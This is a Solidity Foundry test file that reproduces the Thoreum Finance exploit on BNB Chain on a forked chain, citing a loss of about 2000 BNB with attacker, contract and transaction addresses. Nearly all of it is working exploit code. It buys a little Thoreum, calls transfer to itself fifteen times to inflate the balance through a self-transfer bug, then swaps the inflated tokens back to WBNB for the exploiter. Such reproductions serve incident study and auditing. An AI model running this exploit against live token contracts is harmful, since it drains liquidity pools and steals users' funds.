// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~2000 BNB (6 BNB in this tx)
// Attacker : 0x1ae2dc57399b2f4597366c5bf4fe39859c006f99
// Attack Contract : 0x7d1e1901226e0ba389bfb1281ede859e6e48cc3d
// Vulnerable Contract : 0xce1b3e5087e8215876af976032382dd338cf8401
// Attack Tx : https://bscscan.com/tx/0x3fe3a1883f0ae263a260f7d3e9b462468f4f83c2c88bb89d1dee5d7d24262b51

// @Info
// Vulnerable Contract Code : https://bscscan.com/token/0xce1b3e5087e8215876af976032382dd338cf8401#code

// @Analysis
// Ancilia : https://twitter.com/AnciliaInc/status/1615944396134043648

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakeRouter constant router = IPancakeRouter(payable(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8));

address constant wbnb_addr = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant thoreum_addr = 0xCE1b3e5087e8215876aF976032382dd338cF8401;
address constant wbnb_thoreum_lp_addr = 0xd822E1737b1180F72368B2a9EB2de22805B67E34;
address constant exploiter = 0x1285FE345523F00AB1A66ACD18d9E23D18D2e35c;
IWBNB constant wbnb = IWBNB(payable(wbnb_addr));
THOREUMInterface constant THOREUM = THOREUMInterface(thoreum_addr);

contract Attacker is Test {
    //  forge test --contracts ./src/test/ThoreumFinance_exp.sol -vvv
    function setUp() public {
        cheat.label(address(router), "router");
        cheat.label(thoreum_addr, "thoreum");
        cheat.label(exploiter, "exploiter");
        cheat.label(wbnb_addr, "wbnb");
        cheat.label(wbnb_thoreum_lp_addr, "wbnb_thoreum_lp");
        cheat.createSelectFork("bsc", 24_913_171);
    }

    function testExploit() public {
        Exploit exploit = new Exploit();
        emit log_named_decimal_uint("[start] Attacker wbnb Balance", wbnb.balanceOf(exploiter), 18);
        exploit.harvest();
        emit log_named_decimal_uint("[End] Attacker wbnb Balance", wbnb.balanceOf(exploiter), 18);
    }
}

contract Exploit is Test {
    function harvest() public {
        //  step1: get some  thoreum token
        vm.deal(address(this), 0.003 ether);
        wbnb.deposit{value: 0.003 ether}();
        wbnb.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(THOREUM);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.003 ether, 0, path, address(this), block.timestamp
        );
        emit log_named_decimal_uint("[INFO] address(this) thoreum  balance : ", THOREUM.balanceOf(address(this)), 18);

        //  step2: loop transfer function 15 times
        for (uint256 i = 0; i < 15; i++) {
            THOREUM.transfer(address(this), THOREUM.balanceOf(address(this)));
            emit log_named_decimal_uint(
                "[INFO] address(this) thoreum  balance : ", THOREUM.balanceOf(address(this)), 18
            );
        }

        //step3: swap thoreum to wbnb
        THOREUM.approve(address(router), type(uint256).max);
        wbnb.approve(wbnb_thoreum_lp_addr, type(uint256).max);
        address[] memory path2 = new address[](2);
        path2[0] = address(THOREUM);
        path2[1] = address(wbnb);
        emit log_named_decimal_uint("[INFO] address(this) thoreum  balance : ", THOREUM.balanceOf(address(this)), 18);
        while (THOREUM.balanceOf(address(this)) > 40_000 ether) {
            emit log_named_decimal_uint("[INFO] address(exploiter) wbnb  balance : ", wbnb.balanceOf(exploiter), 18);
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                40_000 ether, 0, path2, exploiter, block.timestamp
            );
        }
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            THOREUM.balanceOf(address(this)), 0, path2, exploiter, block.timestamp
        );
    }

    receive() external payable {}
}

interface THOREUMInterface is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}
